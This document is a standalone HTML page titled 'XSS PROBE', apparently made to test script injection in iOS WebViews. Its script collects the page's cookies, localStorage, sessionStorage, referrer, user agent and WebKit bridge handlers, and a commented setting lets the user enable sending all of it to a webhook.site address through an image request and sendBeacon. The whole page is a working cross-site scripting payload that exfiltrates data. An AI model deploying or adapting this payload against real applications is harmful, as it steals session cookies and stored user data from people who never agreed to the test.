<!doctype html>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>XSS PROBE</title>
<body style="font:15px -apple-system,Helvetica;padding:16px;background:#fff;color:#111">
<h1 style="color:#c00;font-size:22px;margin:0 0 12px">HTML EXECUTED</h1>
<pre id="o" style="font:12px ui-monospace,Menlo;white-space:pre-wrap;word-break:break-all"></pre>
<script>
var HOOK = ""; // 填 webhook.site 地址即启用回连，例：https://webhook.site/xxxxxxxx-xxxx-xxxx
var L = [], B = "none";
try { B = (window.webkit && window.webkit.messageHandlers) ? (Object.keys(window.webkit.messageHandlers).join(",") || "empty") : "none"; } catch (e) { B = "ERR"; }
function g(f) { try { return f(); } catch (e) { return "ERR"; } }
L.push("href      = " + location.href);
L.push("origin    = " + location.origin);
L.push("referrer  = " + (document.referrer || "(none)"));
L.push("bridge    = " + B);
L.push("cookie    = " + g(function () { return document.cookie || "(empty)"; }));
L.push("localStg  = " + g(function () { return JSON.stringify(localStorage); }));
L.push("sessStg   = " + g(function () { return JSON.stringify(sessionStorage); }));
L.push("ua        = " + navigator.userAgent);
document.getElementById("o").textContent = L.join("\n");
if (HOOK) {
  var q = encodeURIComponent(L.join(" | "));
  new Image().src = HOOK + "/hit?d=" + q;
  try { navigator.sendBeacon(HOOK + "/hit2?d=" + q); } catch (e) {}
}
alert("XSS OK\n" + location.origin + "\nbridge = " + B);
</script>
